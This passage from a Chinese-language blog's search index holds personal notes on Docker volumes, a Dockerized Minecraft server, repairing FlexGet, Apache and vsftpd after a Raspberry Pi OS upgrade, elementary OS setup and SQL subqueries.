volume筆記","url":"%2Fblog%2F2018%2F01%2F14%2Flogdown%2F2018-01-14-docker-volume-notes%2F","content":"上一篇，記錄使用Docker架設Minecraft-server\n突中還發現Volume要怎麼使用，以前沒有用對方法\n在些記錄一下\n\n<!--more-->\n\n# docker查詢掛載資訊\n\n一般使用volumes\n```\ndocker run -d -P -v /usr/local/apache2/htdocs  httpd\n```\n\n```\ndocker inspect -f '{{.Mounts}}' container_id\n```\n查詢volumes目錄路徑\n之前我以為覆製檔案只能用`docker cp`\n現在不用煩腦怎麼覆製\n\n但我還有一個遺問\n怎麼知道container workdir路徑是什麼\n\n\n# Docker image WorkDir 目錄\n\n常常不知道，image 預設啟動目錄在哪裡，又要跑去翻文件\n有時候想直接看到...，這時候下這個指令\n\n```\ndocker image inspect httpd\n```\n可以看到WorkingDir路徑\n\n\n# Docker 掛載常見寫法差別\n\n```\ndocker run -P -d -v /usr/local/apache2/htdocs httpd\n```\n和\n```\ndocker run -P -d -v /usr/local/apache2/htdocs:/usr/local/apache2/htdocs httpd\n```\n這個一樣\n\n今天發現原來是不一樣的東西，\n原本爬文找有沒有第一次volumes時候把image東西copy出來\n`docker run -P -d -v /usr/local/apache2/htdocs httpd` 這個指令就是做這個動作\n只不過volume存在`docker inspect musing_hopper | grep volume`\n可以看到存在位置，所以`/usr/local/apache2/htdocs`是指container path\n\n\n# Docker volumes 路徑\n\ndocker volumes 存在位置在`/var/lib/docker/volumes`需要有root權限才能進去\n\ndocker rm 並不會刪除volumes檔\n想一次刪掉container跟volume嗎?\n只要下這個指令`docker rm -v container_id`\n就能玩成目地了\n\n# Docker 快速刪除\n\n又看到更外速刪除container,volume方法\n```\ndocker container prune\nor\ndocker rm $(docker ps -aq)\n```\n\n這個刪除volume也會把link清掉\n```\ndocker rm -lv CONTAINER\n```\n更多內容在[docker容器删除了，link怎么还在？ - SegmentFault](https://segmentfault.com/q/1010000010367238)裡面\n\n\n\n先記錄到這邊，感覺link也需要好好筆記\n我竟然不知道要清除link這個東西，以為他會自動消失(汗)\n\n\n題外話：\n[Docker volume 簡單用法 | 只放拖鞋的鞋櫃](http://julianchu.net/2016/04/19-docker.html)\n[10 Docker Tips and Tricks That Will Make You Sing A Whale Song of Joy | I care, I share, I'm Nathan LeClaire.](https://nathanleclaire.com/blog/2014/07/12/10-docker-tips-and-tricks-that-will-make-you-sing-a-whale-song-of-joy/)\n[Remove dangling docker images](https://gist.github.com/anildigital/862675ec1b7bccabc311)\n[Maxkit: Dockerfile 初步閱讀與學習紀錄](http://blog.maxkit.com.tw/2017/02/dockerfile.html)\n[深入理解docker的link机制-博客-云栖社区-阿里云](https://yq.aliyun.com/articles/55912)\n[清理Docker的container，image与volume · 零壹軒·笔记](http://note.qidong.name/2017/06/26/docker-clean/)\n[docker容器删除了，link怎么还在？ - SegmentFault](https://segmentfault.com/q/1010000010367238)","tags":["Docker"],"categories":["Docker"]},{"title":"簡單使用docker架設Minecraft-server","url":"%2Fblog%2F2018%2F01%2F14%2Flogdown%2F2018-01-14-simple-use-of-docker-erection-minecraft-server%2F","content":"最近想架一個Minecraft-Server\n但我想找一個比較方便的方法裝\n後來找到[itzg/minecraft-server - Docker Hub](https://hub.docker.com/r/itzg/minecraft-server/)\n\n<!--more-->\n\n簡單使用\n```\ndocker run -d -v /path/on/host:/data \\\n    -e EULA=TRUE \\\n    -p 25565:25565 -e EULA=TRUE --name mc itzg/minecraft-server\n ```\n\nDocker Hub分數還滿高的image\n\nserver.properties的設定可以用`-e xxx=xxx`參數使用\n\n然後發現[dockerfiles/minecraft-server at master · itzg/dockerfiles](https://github.com/itzg/dockerfiles/tree/master/minecraft-server)作者有寫好docker-compose.yml檔\n\n可直接使用`docker-compose up -d`\n可以在`docker-compose.yml`檔設定一些environment variable\n和沒有要使用的rcon移除\n\n要關閉就使用`docker-compose down`\n但這個不會移除container跟volume\n`docker-copmpose down -f` 移除container\n或著\n`docker-compose down -v`移除container和volume\n","tags":["Docker"],"categories":["Docker"]},{"title":"更新系統flexget壞掉啦!!","url":"%2Fblog%2F2018%2F01%2F07%2Flogdown%2F2018-01-07-4726929%2F","content":"想說flexget應該正常\n結果執行flexget -v\n```\n找不到/bin/xxx/python2.6\n```\n\n<!--more-->\n\n升級OS後python是2.7\n想說直接升級flexget\n```\nsudo pip install --upgrade setuptools\nsudo pip install --upgrade flexget\n```\n[FlexGet官方升級說明](https://flexget.com/Upgrade)\n\n但是不成功...\n\n```\nsudo pip install --upgrade --force-reinstall flexget\n```\n[python - Can I force pip to reinstall the current version? - Stack Overflow](https://stackoverflow.com/questions/19548957/can-i-force-pip-to-reinstall-the-current-version)\n\n還是安裝失敗 囧\n\n```\nsudo pip3 install --upgrade --force-reinstall flexget\n```\npip3就可以了... 不知道為什麼\n`.flexget/db-config.sqlit`要刪掉\n\n\n執行`flexget --test execute`怎麼跑出錯誤`Transmissionrpc module version 0.11 or higher required`\n```\nsudo pip3 install  transmissionrpc\n```\n\n\n\n`flexget --test execute`跑出\n```\n2018-01-07 22:07 VERBOSE  manager                       Creating new database /home/pi/.flexget/test-config.sqlite - DO NOT INTERUPT ...\n2018-01-07 22:08 CRITICAL manager                       [/templates/autoPass] The key `disable_builtins` is not valid here. Only known plugin names are valid keys.\n2018-01-07 22:08 CRITICAL manager                       [/templates/olddownload] The key `disable_builtins` is not valid here. Only known plugin names are valid keys.\n2018-01-07 22:08 CRITICAL manager                       [/templates/default] The key `disable_builtins` is not valid here. Only known plugin names are valid keys.\n2018-01-07 22:08 CRITICAL manager\n```\n\n\n是`config.yml`裡設定disable_buildin關係\n```\ndisable_builtins: [seen_info_hash]\n```\n先暫時移除\n改寫法可能是下面這段\nhttps://flexget.com/Plugins/disable\n\n先分享我的config.yml\n```\ntemplates:\n  default:\n    transmission:\n      host: localhost\n      port: 9091\n      username: username\n      password: usernamepassword\n      addpaused: no\n      path: /mnt/extHDD/Download/Mikata/201710/{{task}}\n    free_space:\n      path: /mnt/extHDD/\n      space: 1000\n    clean_transmission:\n      host: localhost\n      port: 9091\n      username: username\n      password: usernamepassword\n      finished_for: 4 days\n      min_ratio: 1\n    if:\n      - \"'季度全集' in category\": reject\n  olddownload:\n    transmission:\n      host: localhost\n      port: 9091\n      username: username\n      password: usernamepassword\n      addpaused: no\n      path: /mnt/extHDD/Download/Mikata/201707/{{task}}\n    free_space:\n      path: /mnt/extHDD/\n      space: 1000\n    clean_transmission:\n      host: localhost\n      port: 9091\n      username: username\n      password: usernamepassword\n      finished_for: 4 days\n      min_ratio: 1\n    if:\n      - \"'季度全集' in category\": reject\n  autoPass:\n    transmission:\n      host: localhost\n      port: 9091\n      username: username\n      password: usernamepassword\n      addpaused: yes\n      path: /mnt/extHDD/Download/Mikata/201707/{{task}}\n    if:\n      - \"'季度全集' in category\": reject\n\ntasks:\n  Fate/Apocrypha:\n    rss:\n      url: https://share.dmhy.org/topics/rss/sort_id/2/rss.xml?keyword=Apocrypha+team_id%3A37+720+繁\n      other_fields: [category]\n    accept_all: yes\n    template: default\n```\n\n參考來源：\n[python - Can I force pip to reinstall the current version? - Stack Overflow](https://stackoverflow.com/questions/19548957/can-i-force-pip-to-reinstall-the-current-version)\n[FlexGet](https://flexget.com/Plugins/disable)\n[FlexGet](https://flexget.com/Upgrade)\n[[SOLVED] Flexget can't see Transmissionrpc is installed - help - Forum - FlexGet](https://discuss.flexget.com/t/solved-flexget-cant-see-transmissionrpc-is-installed/2508)","tags":["flexget"],"categories":["Linux"]},{"title":"[Pietty]Vim不能貼上問題&換字體顏色","url":"%2Fblog%2F2018%2F01%2F07%2Flogdown%2F2018-01-07-pietty-vim-cant-put-up-a-problem%2F","content":"自重Raspberry Pi 升級後\nsudo vim  編輯不能右鍵貼上了\n[Copy/paste into SSH'd VIM from local (Windows) clipboard - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/110684/copy-paste-into-sshd-vim-from-local-windows-clipboard)\n\n\n藍色文字看不太到\n[(技巧分享)更改PieTTY字體顏色.讓眼睛更舒服？ - 102-14雲端班 - 老爹隨筆私塾 - 老爹隨筆](http://www.oldpa.tw/forum/forum.php?mod=viewthread&tid=2186)\n\n\n","tags":["pietty"],"categories":["Linux"]},{"title":"更新系統apache壞掉，從零開始設定","url":"%2Fblog%2F2018%2F01%2F07%2Flogdown%2F2018-01-07-4726228%2F","content":"由於更新系統\napache也更著升到2.4\n查一些資料，有些升級設定檔不太一樣\n所以我沒有選擇保留設定檔\n\n<!--more-->\n\n#設定htaccess\n\n首先，我發現我的htaccess沒有生效\n太久設定的東西，大概忘了一半XD\n```\n<Directory \"/var/www\">\nAllowOverride All\n</Directory>\n```\n\n這個設定完還不夠安全\nhttp://xxxxx.com/.htaccess可以看到裡面資訊\n\n我還發現我有設定\n```\n<Files ~ \"^\\.ht\">\n    Order allow,deny\n    Deny from all\n    Satisfy all\n    EnableSendfile Off\n</Files>\n<Files ~ \".part$\">\norder allow,deny\ndeny from all\n</Files>\n```\n更換成\n```\n<Files ~ \"^\\.ht\">\n    Require all denied\n    Satisfy all\n    EnableSendfile Off\n</Files>\n<Files ~ \".part$\">\n    Require all denied\n</Files>\n```\n\n想說我之前有寫過autoindex筆記\n後來發現裡面沒有記很多東西\n今天來補一補吧\n```.htaccess\n<Files ~ \".part$\">\norder allow,deny\ndeny from all\nSatisfy All\n</Files>\nOrder deny,allow\nDeny from all\nAuthName \"Please type password\"\nAuthType Basic\nAuthUserFile \"----你看不到----/.htpasswd\"\nrequire valid-user\nIndexHeadInsert \"<meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"><link rel=\\\"shortcut icon\\\" type=\\\"image/png\\\" href=\\\"/include/favicon.ico\\\"/>\"\nIndexStyleSheet \"/include/autoindex.css\"\nAllow from 192.168.1.0/24\nSatisfy Any\n```\n\n```\n    Usage:\n        htpasswd [-cmdpsD] passwordfile username\n        htpasswd -b[cmdpsD] passwordfile username password\n\n        htpasswd -n[mdps] username\n        htpasswd -nb[mdps] username password\n     -c  创建一个新的加密密码文件\n     -n  不更新文件，显示结果\n     -m  使用MD5加密密码\n     -d  使用CRYPT加密密码（默认）\n     -p  不加密密码\n     -s  使用SHA加密密码\n     -b  直接在命令行输入密码，而不是提示后再输入密码\n     -D  删除用户\n    在Windows, NetWare与 TPF系统，'-m' 是默认的密码加密方式。\n    在所有其他系统，'-p'可能不能使用。\n\n\n    設定帳號密碼\n    htpasswd -c .htpasswd username\n```\n[使用apache htpasswd生成加密的密码文件，并使用.htaccess控制目录访问 - 傲雪星枫 - CSDN博客](http://blog.csdn.net/fdipzone/article/details/41020045)\n\n\n我真的忘記^\\.ht是不是我設定的\n裡面來有一些設定說明\n>之前在 VirtualBox 的 Shared Folder 進行開發，在寫 PHP 的時候都沒問題， 但是只要碰到靜態檔案，例如 Js 檔，明明修改了，看到的還是舊的版本。\n這時候只要重開 Apache 就好了，但是每次這樣重開也不是辦法，於是 Google 一下是哪裡出了問題。 發現是 Apache 的 sendfile 在做怪，這是一個利用 Kernel 的 sendfile 來加速靜態檔案發送的功能。\n\n[VirtualBox Apache Sendfile - 蟑螂窩](http://blog.roachking.net/blog/2013/01/26/virtualbox-sendfile/)\n\n>最早接觸Satisfy，是這樣一個情況，一個目錄啟用了密碼保護，想單獨開放它的一個子目錄，讓這個子目錄無須密碼即可訪問\n\n[Apache的Satisfy详解 – Fwolf's Blog](http://www.fwolf.com/blog/post/341)\n## 更多參考：\n[鳥哥的 Linux 私房菜 -- WWW 伺服器 Apache](http://cn.linux.vbird.org/linux_server/0360apache_3.php)\n[存取限制](https://dywang.csie.cyut.edu.tw/dywang/rhel7/node41.html)\n\n#設定https\n由於之前用certbot設定過了\n只要加設定就可以了\n\n###舊設定\n```\n        ServerAdmin service@<<不讓你看>>\n        DocumentRoot /var/www/\n        ServerName <<不讓你看>>\n        ServerAlias <<不讓你看>>\n\n        SSLEngine On\n        SSLCertificateFile /etc/letsencrypt/live/<<不讓你看>>/cert.pem\n        SSLCertificateKeyFile /etc/letsencrypt/live/<<不讓你看>>/privkey.pem\n        SSLCertificateChainFile /etc/letsencrypt/live/<<不讓你看>>/chain.pem\n        SSLCACertificateFile /etc/letsencrypt/live/<<不讓你看>>/fullchain.pem\n```\n 發現好像可以不用設定上面一些Name\n 直接照上面網址設定\n ### 新設定\n\n```\n         SSLEngine On\n        SSLCertificateFile /etc/letsencrypt/live/<<不讓你看>>/cert.pem\n        SSLCertificateKeyFile /etc/letsencrypt/live/<<不讓你看>>/privkey.pem\n        SSLCertificateChainFile /etc/letsencrypt/live/<<不讓你看>>/chain.pem\n        SSLCACertificateFile /etc/letsencrypt/live/<<不讓你看>>/fullchain.pem\n```\n\n#設定http2\n然後參照[\\[網站\\] 網域搬新家、升級 HTTPS 與 HTTP/2（長篇大論版） – Digiologist](https://lcarbon.idv.tw/%E7%B6%B2%E7%AB%99-%E7%B6%B2%E5%9F%9F%E6%90%AC%E6%96%B0%E5%AE%B6%E3%80%81%E5%8D%87%E7%B4%9A-https-%E8%88%87-http2%EF%BC%88%E9%95%B7%E7%AF%87%E5%A4%A7%E8%AB%96%E7%89%88%EF%BC%89/)設定https\n發生悲劇\n怎麼會沒有http2 mod\n後來發現要apache2.4.7才有，apache 2.4.1沒有\n系統繼續升級到stretch，就能更新到2.4.7\n照上面執行就能順利完成\n\n簡單記錄設定\n```\n$ sudo a2enmod http2\n$ sudo service  apache2 restart\n```\n 在`/etc/apache2/sites-enabled/000-default.conf` 裡VirtualHost加入：\n```\nProtocols h2 http/1.1\n```\n 在`/etc/apache2/sites-enabled/default-ssl.conf` 裡VirtualHost加入：\n```\nProtocols h2 h2c http/1.1\n```\n重啟apache就能正常，可以瀏覽器開放著工具是不是http2\n```\n$ sudo service apache2 reload\n```\n\n剩下就是http導https頁面\n今天剛好看到[用.htaccess自動導向https – I’m a Taiwan based UIUX designer.](https://jerrylin.blog/code-1-b222579a988)\n```\nRewriteEngine On\n// 開啟rewrite這個功能模組\n\nRewriteCond %{SERVER_PORT} 80\n// RewriteCond：rewrite condition 重寫條件，\n// %則是變數的意思，也就是{SERVER_PORT} 80是重寫的條件(變數)。\n// 整句意思是：所有由port 80的連線為…(接續下行)\n\nRewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]\n// RewriteRule：重寫規則為…，\n// ^(.*)$：任意字元，\n// %{HTTP_HOST}%{REQUEST_URI}：訪問的主域名與相對位址，\n// [L,R=301]：L為last，最後一條規則，\n// R=301則是http協議中的狀態碼，意為永久改變位置。\n// 整句意思是：永久重寫所有連線為https的網址\n```\n[htaccess 常用命令 - 小小工程師的日常筆記 -](http://xdeath.dyndns.pro/read.php?52)\n\n因為我還有特殊需\n還需要設定autoindex照日期排序\n```\n<IfModule mod_autoindex.c>\n...\nIndexOrderDefault Descending Date\n...\n</IfModule>\n```\n\n這次經驗覺得設定檔還是要寫一下注解\n不然放置很久，都不知道是不是自己加的XD\n\n\n\n[解決問題 SSL/TLS (2) | Leo Yeh's Blog](http://leoyeh.me:8080/2017/08/12/%E8%A7%A3%E6%B1%BA%E5%95%8F%E9%A1%8C-SSL-TLS-2/)\n[使用a2ensite和a2dissite来快速切换站点 - CSDN博客](http://blog.csdn.net/hfahe/article/details/5490223)\n[風和日麗 天氣晴: Apache 的 .htaccess 失效？](http://what-a-good-day.blogspot.com/2008/02/apache-htaccess.html)\n[htaccess 常用命令 - 小小工程師的日常筆記 -](http://xdeath.dyndns.pro/read.php?52)","tags":["apache"],"categories":["Apache"]},{"title":"更新系統vsftpd壞掉事情","url":"%2Fblog%2F2018%2F01%2F07%2Flogdown%2F2018-01-07-4726190%2F","content":"上篇更新系統完\n我遇到vsftpd沒辦法啟動\n簡單記錄採雷筆記\n<!--more-->\n\n\n由於怕新版設定檔不太一樣\n所以我就沒有保留舊的設定檔(當然我有先抓下來預備)\n\n其怪怎麼無法啟動vsftpd\n\n```sh\npi@raspberrypi  $ sudo dpkg --configure  vsftpd\n設定 vsftpd (3.0.2-17+deb8u1) ...\nvsftpd user (ftp) already exists, doing nothing.\n\nvsftpd directory (/srv/ftp) already exists, doing nothing.\ninsserv: warning: script 'K02noip2' missing LSB tags and overrides\ninsserv: warning: script 'noip2' missing LSB tags and overrides\n[warn] Starting FTP server: vsftpd[....] vsftpd failed - probably invalid config. ... (warning).\ninvoke-rc.d: initscript vsftpd, action \"start\" failed.\ndpkg: error processing package vsftpd (--configure):\n 子程序 已安裝的 post-installation script 傳回了錯誤退出狀態 1\n處理時發生錯誤：\n vsftpd\n ```\n 後來發現，/etc/init.d/vsftpd裡面腳本執行有問題\n 我試著執行`sudo vsftpd`\n\n ```\n pi@raspberrypi /etc/apache2/sites-enabled $ sudo vsftpd\n500 OOPS: socket\n```\n\nGoogle一下，發現沒有幾個人遇到這個問題\n\n後來把/etc/vsftpd\n設定改\n`listen=YES`\n\n之後又遇到\n```\npi@raspberrypi $ sudo vsftpd\n500 OOPS: run two copies of vsftpd for IPv4 and IPv6\n```\n\n把/etc/vsftpd\n`#listen_ipv6=YES`或改成`listen_ipv6=NO`\n就能正常運行\n\n","tags":["vsftpd"],"categories":["vsftpd"]},{"title":"Raspberry pi 從0開始遇到問題(無法登入ssh)  & 更新Jessie升級","url":"%2Fblog%2F2018%2F01%2F06%2Flogdown%2F2018-01-06-raspberry-pi-encountered-problems-starting-from-0-unable-to-log-in-ssh%2F","content":"最近好想把Apache升級到2.4，這樣我就能使用http2\n不過因為樹莓派一直卡在Wheezy\n原本想說原升怎麼沒到2.4\n後來發現Jessie才能升...\n想說怎麼都沒有更新\n現在版本是Stretch\n\n<!--more-->\n\n好想升Apache 2.4阿\n![](https://i.imgur.com/88ccSit.gif)\n\n最先有試著用[葉難: Raspberry Pi：如何更新Raspbian](http://yehnan.blogspot.com/2014/09/raspberry-piraspbian.html)\n`rpi-upgrade`更新上去，但是沒有更新最高\n\n[Raspbian 從 7 Wheezy 升級到 8 Jessie - 亂碼中的煉金術](http://blog.dreambreakerx.com/2015/10/upgrade-raspbian-from-wheezy-to-jessie/)\n>    修改檔案 /etc/apt/sources.list 把第一行所有的 “wheezy” 置換為 “jessie” ，修改後大概是這樣 “deb http://mirrordirector.raspbian.org/raspbian/ jessie main contrib non-free rpi”\n 修改檔案 /etc/apt/sources.list.d/raspi.list 把第一行所有的 “wheezy” 置換為 “jessie”，第一行最後加上 “ ui” ，修改後大概是這樣 “deb http://archive.raspberrypi.org/debian jessie main ui”\n    建立資料夾 /home/pi/.config/autostart ， “mkdir /home/pi/.config/autostart” (注意 config 前面有 “.” )\n    更新軟體套件庫 “sudo apt-get update”\n    升級系統及軟體 “sudo apt-get -y dist-upgrade” (這過程大概兩小時， “-y” 是不詢問直接安裝)\n\n改socues.list可以試試`sudo sed -i 's/wheezy/jessie/g' /etc/apt/sources.list`\n改完執行下面，就更新完成\n```sh\nsudo apt-get update\nsudo apt-get -y dist-upgrade\n```\n\n更新前最好備份SD會比較好\n我有apache2跟vsftpd有壞掉\n下面幾篇會補一下我遇到的問題\n\n更新期間還會問要不要保留設定檔\n通常我都會選D ，看有異動什麼檔案\n假如沒有問題，就直接更換\n\n中間我原本想wheezy直接升到Stretch\n所以直接把wheezy改成stretch\n但好像升級有問題，可能不執直接跳兩階XD\n網路上有些人說用`rpi-upgrade`，有些說不要用`rpi-rpgrade`\n但後面都有用`apt-get update  & apt-get - y dist-upgrade`\n\n\n\n## 最新燒入新版img預設沒有開啟ssh\n\n>開啟SSH功能\n2016-11-25:\n* SSH disabled by default; can be enabled by creating a file with name \"ssh\" in boot partition\n意思應該是說創建一個名叫\"ssh\"的文件在boot分區,應該就是內存卡的根目錄。\n\n在/boot目錄  `touch ssh`\n開機才會啟動ssh\n重新燒img想說怎麼連不到XD\n原來新版有改\n\n#swap 更新完吃2G\n`/etc/dphys-swapfile`設定`CONF_SWAPSIZE=100`\n存檔之後`service dphys-swapfile start`就正常了\nhttps://blog.gtwang.org/iot/raspberry-pi/raspberry-pi-swap-configuration-using-usb-stick/\n\n\n\n\n## 參考來源\n[raspbian 系统配置中遇到的坑 NOOBS_v2_4_0_MozartC_新浪博客](http://blog.sina.com.cn/s/blog_6c9c71840102woam.html)\n[Raspberry Pi 的基礎 - 沒螢幕、沒鍵盤、沒網路，居然也能設定 Wi-FI 連線 | IT 技術家](http://blog.itist.tw/2017/03/headless-wifi-setup-without-monitor-keyboard-or-cables-for-raspberry-pi-zero-w-and-3-model-b.html)\n[Enable HTTP2 in Apache on Ubuntu 16.04 | DigitalOcean](https://www.digitalocean.com/community/questions/enable-http2-in-apache-on-ubuntu-16-04)\n[\\[網站\\] 網域搬新家、升級 HTTPS 與 HTTP/2（長篇大論版） – Digiologist](https://lcarbon.idv.tw/%E7%B6%B2%E7%AB%99-%E7%B6%B2%E5%9F%9F%E6%90%AC%E6%96%B0%E5%AE%B6%E3%80%81%E5%8D%87%E7%B4%9A-https-%E8%88%87-http2%EF%BC%88%E9%95%B7%E7%AF%87%E5%A4%A7%E8%AB%96%E7%89%88%EF%BC%89/)\n[Raspberry Pi 的基礎 - 沒螢幕、沒鍵盤、沒網路，居然也能設定 Wi-FI 連線 | IT 技術家](http://blog.itist.tw/2017/03/headless-wifi-setup-without-monitor-keyboard-or-cables-for-raspberry-pi-zero-w-and-3-model-b.html)\n[树莓派系统升级Raspbian Wheezy到Raspbian Jessie(树莓派2B+） – 默默的点滴](http://www.mobibrw.com/2017/9851?utm_source=tuicool&utm_medium=referral)","tags":["Raspberry Pi"],"categories":["Linux"]},{"title":"elementary OS 裝機小體驗","url":"%2Fblog%2F2018%2F01%2F04%2Flogdown%2F2018-01-04-4718279%2F","content":"長期有一台筆電都是用Ezgo，最近看到有人寫 [[2018 鐵人賽] 簡潔高效的 PHP & Laravel 工作術：從 elementary OS 下手的聰明改造提案 #1](https://medium.com/@shengyou/2018ironman-eos-for-php-developer-day1-f9eaeff8e554)\n就試著裝裝看XD，沒想到比我裝的Ezgo非常順\n操作介面有點像mac\n就簡單做一下記錄\n\n<!--more-->\n\n輸入法這個照做就可以完成\n[[2018 鐵人賽] 簡潔高效的 PHP & Laravel 工作術：從 elementary OS 下手的聰明改造提案 #10](https://medium.com/@shengyou/2018ironman-eos-for-php-developer-day10-1a15f454d7c6)\n\n其中我還遇到很奇怪的事\n目前懷疑是appcenter壞掉\n導至我系統壞掉...重開機也不能登入(就是  登入一定去就馬上登出，登入畫面也沒圖片)\n目前有[applications - App Center stuck on 'waiting' - elementary OS Stack Exchange](https://elementaryos.stackexchange.com/questions/11454/app-center-stuck-on-waiting)\n在tty1下這個`dpkg --configure -a`指令就可以正常進去了\n\n原本在樹莓派使用TightVNC\n在elementary OS進然一進去沒有畫面\n在粉絲團詢問到好用的遠端\n有人推AnyDesk\n真的很好用，還有cli指令\n[Command Line Interface – Customer Feedback for AnyDesk](http://support.anydesk.com/knowledgebase/articles/441867-command-line-interface)\n\n開機登入自動啟動`anydesk --start-service`\n\n\n\n[[2018 鐵人賽] 簡潔高效的 PHP & Laravel 工作術：從 elementary OS 下手的聰明改造提案 #1](https://medium.com/@shengyou/2018ironman-eos-for-php-developer-day1-f9eaeff8e554)\n[applications - App Center stuck on 'waiting' - elementary OS Stack Exchange](https://elementaryos.stackexchange.com/questions/11454/app-center-stuck-on-waiting)\n[elementary OS 0.4 Loki安装后的配置 - 简书](https://www.jianshu.com/p/1e104090ffaa)\n"},{"title":"Hello World","url":"%2Fblog%2F2018%2F01%2F01%2Fhello-world%2F","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n"},{"title":"SQL子查詢筆記(相關子查詢/非相關子查詢)","url":"%2Fblog%2F2017%2F12%2F23%2Flogdown%2F2017-12-23-sql-subquery-notes%2F","content":"\n~~之前用子查詢第二層，竟然抓不到外層的欄位~~\n已經找到 [終於知道為什麼子查詢沒辦法抓取外面的表 | 程式狂想筆記](https://malagege.github.io/blog/2018/12/24/%E7%B5%82%E6%96%BC%E7%9F%A5%E9%81%93%E7%82%BA%E4%BB%80%E9%BA%BC%E5%AD%90%E6%9F%A5%E8%A9%A2%E6%B2%92%E8%BE%A6%E6%B3%95%E6%8A%93%E5%8F%96%E5%A4%96%E9%9D%A2%E7%9A%84%E8%A1%A8/)\n有時候跟本不知道為什麼?後來問公司的前軰，他說第二層就抓不到最外一層\n但這種強制記這種觀念感覺不是很好，今天 Google 查一下原因\n在這邊整理一下 XD\n\n<!--more-->\n\n今天[多層次子查詢的 sql 執行順序的問題-wj_zizi-ITPUB 博客](http://blog.itpub.net/16591471/viewspace-695491/)和[你真的会玩 SQL 吗？无处不在的子查询 - 文章 - 伯乐在线](http://blog.jobbole.com/95027/)\n看到子查詢有分兩類\n\n1. 相關子查詢\n2. 非相關子查詢\n\n這兩個其實不難分，不要被兩個專有名詞嚇到\n先講非相關子查詢，簡單講就是子查詢跟外面 SQL 查詢內容沒有相關\n非相關子查詢只會跑一次，所以效能上會非常快\n執行順序也比外層先，所以這也是為什麼**非相關子查詢**沒法取得外層欄位的原因\n範例如下，以下子查詢只會查一次\n\n```sql\nSELECT *\nFROM xxxx\nWHERE class = (SELECT max(cost)\nFROM bbbb\n)\n```\n\n相關子查詢就反知，比較吃效能，每一行都會執行 loop\n先不談[slides/SQL_reporting.pdf at master · TritonHo/slides](https://github.com/TritonHo/slides/blob/master/Taipei%202016-08%20talk/SQL_reporting.pdf)裡面有介紹有些 DB 會自動做 join 動作\n這個我們比較常用到\n\n```sql\nSELECT＊\nFROM xxxx a\nWHERE cost > (SELECT avg(cost)\nFROM bbbb\nwhere class = a.class\n)\n```\n\n```sql\nSELECT *\n  FROM a1\nWHERE EXISTS\n(SELECT 'X'\n          FROM (SELECT w2.corp_id FROM a1 w2 WHERE w2.period_id <= a1.period_id) u\n         WHERE u.corp_id = a1.corp_id);\n\n```\n\n[第二层子查询居然不认最外层表中的列 - Oracle 开发 - ITPUB 论坛－中国最专业的 IT 技术社区](http://www.itpub.net/thread-1027910-1-1.html#post_11069036)看到有不能跑的 example\n目前猜測 form 是非相關子查詢，我猜因為 from 會先執行，所以抓不到外層\n\n[sql 语法相关子查询与非相关子查询-流浪的野狼-ITPUB 博客](http://blog.itpub.net/28612416/viewspace-773763/)看到一個標量子查詢(相對於多值子查詢)名稱\n\n```sql\nselect OrderId From Orders where EmployeeId IN\n(select EmployeeId From employees where lastName like 'Da%')\n```\n\n> 將'Davolio'改為'D%'時,這個時候子查詢中返回結果為 2 行,等號右邊此時為多值,查詢失敗.將'='改為 in 謂詞.查詢才能通過.\n> employees 表中無 lastname='jason',外部查詢將返回 null.\n\n## 結論\n\nSQL 有太多東西要學了 XD\n這些離清楚之後比較不容易採到雷\n要學的東西太多了 orz\n\n###20171226 無聊寫的 SQL\n\n```sql\nSELECT a.id, a.rev, a.content\nFROM `docs` a\nWHERE a.id  IN  (\n    SELECT max(id)\n    FROM `docs` b\n    WHERE  b.id IN (SELECT id\n                    FROM `docs` c\n                    WHERE c.id=a.id)\n) ;\n```\n\nhttp://sqlfiddle.com/#!9/a6c585/30596\n原本以為只會有一筆\n\n是 From a table 先執行 而 a 有四筆\n子查詢關連 a.id\n所以結果是 4 筆沒錯\n做 max 也會沒有意義\n\n# 參考來源\n\n[你真的会玩 SQL 吗？无处不在的子查询 - 文章 - 伯乐在线](http://blog.jobbole.com/95027/)\n\n[对象-关系数据库管理系统原理与实现 - 李战怀, 李红燕, 徐秋元 - Google 圖書](https://books.google.com.tw/books?id=OhdwHgymgtcC&pg=PA146&lpg=PA146&dq=%E9%9D%9E%E7%9B%B8%E9%97%9C%E5%AD%90%E6%9F%A5%E8%A9%A2&source=bl&ots=0LYsR2GAVw&sig=pLLTLhWDAIn-Pi1bBbW96wvTkFg&hl=zh-TW&sa=X&ved=0ahUKEwj-3eyKzKDYAhUKT7wKHbkyAKQ4ChDoAQg1MAI#v=onepage&q=%E9%9D%9E%E7%9B%B8%E9%97%9C%E5%AD%90%E6%9F%A5%E8%A9%A2&f=false)\n\n[你真的会玩 SQL 吗？无处不在的子查询 - 文章 - 伯乐在线](http://blog.jobbole.com/95027/)\n\n[多層次子查詢的 sql 執行順序的問題-wj_zizi-ITPUB 博客](http://blog.itpub.net/16591471/viewspace-695491/)\n\n[第二层子查询居然不认最外层表中的列 - Oracle 开发 - ITPUB 论坛－中国最专业的 IT 技术社区](http://www.itpub.net/thread-1027910-1-1.html#post_11069036)\n\n[\\[SQL \\] 兩層以上子查詢辨認 Table 別名 - 看板 Database - 批踢踢實業坊](https://www.ptt.cc/bbs/Database/M.1152841888.A.596.html)\n\n[相關子查詢和嵌套子查詢 - 問問題](http://www.wenwenti.info/article/72559)\n\n[MySql 學習(三) —— 子查詢(where、from、exists) 及 連線查詢(left join、right join、inner join、union join) - 掃文資訊](https://tw.saowen.com/a/a4610b9e7cb588e070f8e48aade920ab12a63ef681d994ccbfcb6753553bc466)\n\n[MySql 学习(三) —— 子查询(where、from、exists) 及 连接查询(left join、right join、inner join、union join) - bojiangzhou - 